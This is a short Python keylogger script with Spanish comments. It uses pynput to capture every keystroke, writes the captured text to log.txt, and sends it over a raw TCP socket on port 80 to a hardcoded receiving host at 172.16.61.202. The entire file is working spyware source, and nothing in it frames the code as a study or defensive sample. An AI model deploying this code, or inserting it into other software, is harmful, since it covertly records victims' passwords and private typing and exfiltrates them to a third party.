from pynput.keyboard import Key, Listener
import socket

keys = []

def presionar_tecla(key):
    if key == Key.space:
        keys.append(" ")
    elif key == Key.backspace:
        keys.append("<backspace>")
    elif hasattr(key, 'char'):  
        keys.append(key.char)
    else:
        keys.append(str(key))

    convertir_string(keys)

def convertir_string(keys):
    data = ''.join(keys)
    with open('log.txt', 'w') as logfile:
        logfile.write(data)
    enviar_datos(data)

def enviar_datos(data):
    host = '172.16.61.202'  # Dirección IP del dispositivo receptor

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((host, socket.getservbyname('http')))
            s.sendall(data.encode())
            print("Datos enviados exitosamente a través de la red.")
        except Exception as e:
            print(f"Error al enviar datos: {e}")

def soltar_tecla(key):
    if key == Key.esc:
        return False

with Listener(on_press=presionar_tecla, on_release=soltar_tecla) as listener:
    listener.join()
